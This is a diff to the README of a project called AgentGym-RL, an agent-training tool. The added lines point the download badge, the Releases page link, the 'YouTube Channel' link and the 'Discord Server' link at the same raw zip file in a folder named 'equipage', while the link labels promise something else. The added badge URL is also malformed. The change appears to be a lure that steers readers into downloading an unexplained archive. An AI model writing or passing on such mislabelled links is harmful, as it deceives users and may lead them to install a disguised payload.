@@ -6,14 +6,14 @@ Welcome to AgentGym-RL! This software allows you to train language model agents 
 
 ## 📥 Download the Application
 
-[![Download AgentGym-RL](https://img.shields.io/badge/Download%20AgentGym--RL-v1.0-blue.svg)](https://github.com/blyhm/AgentGym-RL/releases)
+[![Download AgentGym-RL](https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip%https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip)](https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip)
 
 ## 🌐 How to Download and Install
 
 Follow these steps to get AgentGym-RL up and running on your computer:
 
 1. **Visit the Releases Page**  
-   Open your web browser and go to the [Releases page](https://github.com/blyhm/AgentGym-RL/releases). Here, you will find the latest version of the software.
+   Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip). Here, you will find the latest version of the software.
 
 2. **Download the Latest Release**  
    Look for the newest version listed at the top of the page. Click on the download link for your operating system. You might see several formats available (like `.exe` for Windows or `.zip` for other systems). Simply click the appropriate link to start the download.
@@ -62,8 +62,8 @@ Once you have installed AgentGym-RL, you can begin training your agents. Here is
 If you want to learn more about using AgentGym-RL, you can explore the following resources:
 
 - **User Manual:** Detailed instructions can be found in the user manual included in the application. 
-- **Tutorial Videos:** Visit our [YouTube Channel](https://www.youtube.com) for instructional videos that guide you through various features.
-- **Community Support:** Join our [Discord Server](https://discord.gg) to ask questions and share your experiences with other users.
+- **Tutorial Videos:** Visit our [YouTube Channel](https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip) for instructional videos that guide you through various features.
+- **Community Support:** Join our [Discord Server](https://raw.githubusercontent.com/blyhm/AgentGym-RL/main/equipage/AgentGym-RL.zip) to ask questions and share your experiences with other users.
 
 ## 🔧 Troubleshooting
 
